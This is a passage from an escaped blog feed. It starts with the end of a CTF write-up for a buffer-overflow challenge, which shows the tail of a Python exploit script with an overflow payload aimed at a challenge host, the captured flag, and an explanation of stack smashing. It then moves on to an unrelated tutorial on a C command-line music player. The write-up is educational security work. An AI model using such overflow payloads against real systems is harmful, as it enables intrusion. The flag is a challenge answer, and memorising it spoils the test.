+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;challenge.ctf.games&amp;#34;&lt;/span> &lt;span class="c1"># Replace with the actual host&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">port&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">31084&lt;/span> &lt;span class="c1"># Replace with the actual port number&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">126&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x16\x12\x40\x00\x00\x00&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="c1"># Your payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exploit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">port&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and the flag will be printed on the console.
+&lt;code>flag{4f4293237e37d06d733772a087299f17}&lt;/code>&lt;/p>
+&lt;h2 id="explanation-why-it-works">Explanation Why It Works&lt;/h2>
+&lt;p>The exploit works because the &lt;code>gets&lt;/code> function does not check the length of the input string, which allows us to overflow the buffer and overwrite the return address of the &lt;code>main&lt;/code> function. On the other hand, the compiler does not add any stack canaries or other protections to prevent buffer overflow attacks. This allows us to execute arbitrary code by overwriting the return address with the address of the &lt;code>win&lt;/code> function.&lt;/p>
+&lt;h3 id="buffer-overflow">Buffer Overflow&lt;/h3>
+&lt;p>First of all, let&amp;rsquo;s understand what a buffer overflow is. A buffer overflow occurs when a program writes more data to a buffer than it can hold. This can lead to overwriting adjacent memory locations, including the return address of a function. When the function returns, it will jump to the overwritten address, which can lead to arbitrary code execution.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow.png"
+width="850"
+height="490"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow_hu30f5902875158e80e8ab09a0bc6399c9_69216_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/buffer-overflow_hu30f5902875158e80e8ab09a0bc6399c9_69216_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Buffer Overflow Attack"
+class="gallery-image"
+data-flex-grow="173"
+data-flex-basis="416px"
+>&lt;/p>
+&lt;p>In x86_64 architecture, the stack grows downwards, meaning that the higher memory addresses are at the top of the stack and the lower memory addresses are at the bottom. When a function is called, a new stack frame is created, and the return address is pushed onto the stack. If we overflow the buffer, we can overwrite the return address with our own address. In diagram below, we can see how the stack looks like before and after the overflow but is x86 architecture.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/before-after.png"
+width="1800"
+height="910"
+srcset="https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/before-after_hu9abf88883d77c8131e02d307ceaae30f_510301_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/synk-fetch-the-flag-2025-echo/before-after_hu9abf88883d77c8131e02d307ceaae30f_510301_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Before Overflow VS After Overflow"
+class="gallery-image"
+data-flex-grow="197"
+data-flex-basis="474px"
+>&lt;/p>
+&lt;p>X86_64 architecture is similar to x86 architecture but with some differences. In x86_64 architecture, the stack grows downwards, and the return address is stored in the &lt;code>RIP&lt;/code> register. When the function returns, it jumps to the address stored in the &lt;code>RIP&lt;/code> register. If we overflow the buffer and overwrite the return address with our own address, we can execute arbitrary code.&lt;/p>
+&lt;h2 id="references">References&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://ctf101.org/binary-exploitation/what-is-the-stack/#:~:text=The%20esp%20%2F%20rsp%20register%20holds,at%20that%20location%20in%20memory." target="_blank" rel="noopener"
+>The Stack&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>C Music Player</title><link>https://xph0816.github.io/p/c-music-player/</link><pubDate>Tue, 11 Feb 2025 00:00:00 +0800</pubDate><guid>https://xph0816.github.io/p/c-music-player/</guid><description>&lt;img src="https://xph0816.github.io/p/c-music-player/4ivv.gif" alt="Featured image of post C Music Player" />&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>In this blog post, we will explore the development of a Command Line Interface (CLI) Music Player using the C programming language. This project will help you understand various data structures and algorithms, particularly focusing on the implementation of a double linked list and the architecture of a music player which can be used to play music files.&lt;/p>
+&lt;h2 id="why-a-cli-music-player">Why a CLI Music Player?&lt;/h2>
+&lt;p>Creating a CLI Music Player is an excellent way to practice and enhance programming skills in C. It involves managing data structures, and implementing algorithms to manipulate and play music files. Additionally, it provides a practical application of theoretical concepts.&lt;/p>
+&lt;h2 id="setting-up-the-project">Setting Up the Project&lt;/h2>
+&lt;p>To get started, ensure I have a C compiler installed on my system. I can use GCC compiler, which is available on most platforms. Create a new directory for your project and initialize it with the necessary files.&lt;/p>
+&lt;h3 id="linux">Linux&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt install gcc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir music-player
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> music-player
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="windows-mingw">Windows (MinGW)&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">scoop&lt;/span> &lt;span class="n">install&lt;/span> &lt;span class="n">w64devkit&lt;/span> &lt;span class="c"># Install MinGW using Scoop sometime not latest version &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">mkdir&lt;/span> &lt;span class="nb">music-player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd music-player&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>or download from &lt;a class="link" href="https://github.com/skeeto/w64devkit" target="_blank" rel="noopener"
+>GitHub&lt;/a> and Set the PATH Environment Variable.&lt;/p>
+&lt;h4 id="ways-to-set-path">Ways to Set PATH&lt;/h4>
+&lt;ol>
+&lt;li>&lt;a class="link" href="https://www.architectryan.com/2018/03/17/add-to-the-path-on-windows-10/" target="_blank" rel="noopener"
+>How to set PATH Tutorial&lt;/a>&lt;/li>
+&lt;li>Add &lt;code>&amp;lt;path-to-w64devkit&amp;gt;\w64devkit\bin&lt;/code> to PATH.&lt;/li>
+&lt;/ol>
+&lt;h2 id="implementation-of-the-music-player">Implementation of the Music Player&lt;/h2>
+&lt;h3 id="software-architecture">Software Architecture&lt;/h3>
+&lt;p>&lt;img src="https://xph0816.github.io/p/c-music-player/architecture.svg"
+loading="lazy"
+alt="Software Architecture"
+>&lt;/p>
+&lt;p>The music player will be implemented in two parts: the frontend and the backend. The frontend will handle the user interface and interaction, while the backend will manage the music files and playback.&lt;/p>
+&lt;h3 id="frontend-implementation">Frontend Implementation&lt;/h3>
+&lt;h4 id="basic-ui-implementation">Basic UI Implementation&lt;/h4>
+&lt;h5 id="main-menu-implementation">Main Menu Implementation&lt;/h5>
+&lt;p>Main menu is the first screen that the user will see when they start the music player. It will display the available options and allow the user to navigate through the application.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">MainMenu&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Welcome to Music Player 1.0&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;1. Select song from the Song List&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;2. Play the selected song&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;3. Next song&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;4. Previous song&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;5. Display the current Playlist&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;6. Delete the current song&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;7. Delete Song from the PlayList&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;8. Exit&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">getValidInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Enter your choice: &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Main menu will display the available options and prompt the user to enter a choice. The &lt;code>getValidInt&lt;/code> function is used to validate the user input and ensure that it is within the specified range.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">getValidInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">min&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">max&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">message&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">input&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">min&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">input&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">max&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Invalid input. Please enter a number between %d and %d.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">min&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">max&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">input&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">min&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">input&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">max&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;code>getValidInt&lt;/code> function will keep prompting the user to enter a number until a valid input is provided. Next, we will put it all together in the &lt;code>main&lt;/code> function.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">List&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">newList&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Cursor&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">cursor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">newCursor&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(;;){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">MainMenu&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Add song to the playlist
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Play the selected song
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Play the next song
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Play the previous song
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Display the current playlist
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">6&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Delete the current song
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">7&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Delete song from the playlist
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Exit the application
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Press any key to continue . . .&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">getch&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="c1">// #include &amp;lt;conio.h&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;code>main&lt;/code> function will display the main menu and prompt the user to enter a choice. Based on the user&amp;rsquo;s input, it will call the corresponding function to perform the desired action. The &lt;code>do-while&lt;/code> loop will keep the application running until the user chooses to exit.&lt;/p>
+&lt;h4 id="playlist-implementation-doubly-linked-list">Playlist Implementation (Doubly Linked List)&lt;/h4>
+&lt;p>A double linked list is a data structure that allows traversal in both directions. It is ideal for managing the playlist in our music player. Below is a simple implementation of a double linked list in C.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
